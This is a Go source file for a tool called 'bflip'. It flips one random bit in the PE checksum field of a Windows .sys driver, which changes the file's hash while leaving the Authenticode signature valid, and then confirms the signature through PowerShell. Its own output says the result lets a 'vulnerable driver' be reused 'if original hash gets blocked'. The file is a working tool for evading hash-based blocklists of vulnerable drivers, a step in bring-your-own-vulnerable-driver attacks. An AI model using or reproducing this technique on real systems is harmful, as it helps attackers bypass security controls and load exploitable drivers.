package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type PEHeader struct {
	DOSHeader      []byte
	PESignature    []byte
	FileHeader     []byte
	OptionalHeader []byte
}

type Region struct {
	Start int
	End   int
	Name  string
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("[+] usage: bflip <sys_file>")
		os.Exit(1)
	}
	filename := os.Args[1]
	if filepath.Ext(filename) != ".sys" {
		log.Fatal("[-] error: File must have .sys extension")
	}

	if _, err := os.Stat(filename); os.IsNotExist(err) {
		log.Fatal("[-] file does not exist")
	}
	fmt.Printf("Processing file: %s\n", filename)
	originalData, err := os.ReadFile(filename)
	if err != nil {
		log.Fatalf("[-] error reading file: %v", err)
	}
	originalHash := calculateSHA256(originalData)
	fmt.Printf("[+] original file hash: %s\n", originalHash)
	fmt.Printf("[+] original file size: %d bytes\n", len(originalData))

	checksumOffset, err := findTimestampField(originalData)
	if err != nil {
		log.Fatalf("[-] error: %v", err)
	}

	modifiedData := make([]byte, len(originalData))
	copy(modifiedData, originalData)

	flippedOffset, flippedBit := flipTimestampBit(modifiedData, checksumOffset)

	newHash := calculateSHA256(modifiedData)

	outputFilename := generateOutputFilename(filename)

	err = os.WriteFile(outputFilename, modifiedData, 0644)
	if err != nil {
		log.Fatalf("[-] error writing modified file: %v", err)
	}
	fmt.Printf("\n bit flip completed:\n")
	fmt.Printf("[+]  target: pe checksum field\n")
	fmt.Printf("[+]  offset: %d (0x%X)\n", flippedOffset, flippedOffset)
	fmt.Printf("[+]  bit: %d\n", flippedBit)
	fmt.Printf("[+]  original byte: 0x%02X\n", originalData[flippedOffset])
	fmt.Printf("[+]  modified byte: 0x%02X\n", modifiedData[flippedOffset])

	fmt.Printf("\nfile saved as: %s\n", outputFilename)
	fmt.Printf("original hash: %s\n", originalHash)
	fmt.Printf("modified hash: %s\n", newHash)
	bool, _ := verifySignature(outputFilename)
	if bool == true {
		fmt.Printf("[+] you may reuse this vulnerable driver if original hash gets blocked")
	}
}
func calculateSHA256(data []byte) string {
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])
}

func findTimestampField(data []byte) (int, error) {
	if len(data) < 64 {
		return 0, fmt.Errorf("[-] file too small to be a valid PE file")
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return 0, fmt.Errorf("[-] invalid DOS header signature")
	}
	peOffset := int(binary.LittleEndian.Uint32(data[60:64]))

	if peOffset >= len(data)-24 {
		return 0, fmt.Errorf("[-] invalid PE header offset")
	}
	if data[peOffset] != 'P' || data[peOffset+1] != 'E' || data[peOffset+2] != 0 || data[peOffset+3] != 0 {
		return 0, fmt.Errorf("[-] invalid PE signature")
	}
	coffHeaderOffset := peOffset + 4
	sizeOfOptionalHeader := int(binary.LittleEndian.Uint16(data[coffHeaderOffset+16 : coffHeaderOffset+18]))

	if sizeOfOptionalHeader < 64 {
		return 0, fmt.Errorf("[-] optional header too small")
	}
	optionalHeaderOffset := coffHeaderOffset + 20
	checksumOffset := optionalHeaderOffset + 64

	if checksumOffset+4 > len(data) {
		return 0, fmt.Errorf("[-] checksum field out of bounds")
	}

	return checksumOffset, nil
}

func flipTimestampBit(data []byte, timestampOffset int) (int, int) {
	rand.Seed(time.Now().UnixNano())
	byteIndex := rand.Intn(4)
	byteOffset := timestampOffset + byteIndex
	bitPosition := rand.Intn(8)
	originalTimestamp := binary.LittleEndian.Uint32(data[timestampOffset : timestampOffset+4])
	data[byteOffset] ^= (1 << bitPosition)
	newTimestamp := binary.LittleEndian.Uint32(data[timestampOffset : timestampOffset+4])

	fmt.Printf("[+] flipping bit %d in checksum byte %d (absolute offset %d)\n",
		bitPosition, byteIndex, byteOffset)
	fmt.Printf("[+] checksum field value changed: 0x%08X -> 0x%08X\n", originalTimestamp, newTimestamp)

	return byteOffset, bitPosition
}

func generateOutputFilename(originalFilename string) string {
	ext := filepath.Ext(originalFilename)
	base := originalFilename[:len(originalFilename)-len(ext)]
	timestamp := time.Now().Format("20060102_150405")
	return fmt.Sprintf("%s_flipped_%s%s", base, timestamp, ext)
}

func verifySignature(filename string) (bool, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("(Get-AuthenticodeSignature '%s').Status -eq 'Valid'", filename))
	output, err := cmd.Output()
	if err != nil {
		return false, err
	}
	return strings.TrimSpace(string(output)) == "True", nil
}
